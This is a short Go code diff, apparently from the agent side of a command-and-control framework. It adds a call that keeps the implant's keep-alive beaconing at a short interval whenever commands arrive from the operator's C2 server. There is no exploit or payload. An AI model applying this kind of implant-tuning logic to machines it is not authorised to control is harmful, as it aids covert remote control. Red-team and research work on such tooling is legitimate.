@@ -22,6 +22,9 @@ func HandleC2Command(cmdData *def.MsgTunData) {
 			logging.Errorf("HandleC2Command panic: %v", r)
 		}
 	}()
+	// anything arriving from the CC means the operator is (or was) engaged:
+	// keep the keep-alive loop at its short cadence (see relayHelloBackoff)
+	c2transport.MarkAgentActive()
 
 	// Handle AgentToken push from C2
 	if cmdData.Tag == def.TagAgentToken {
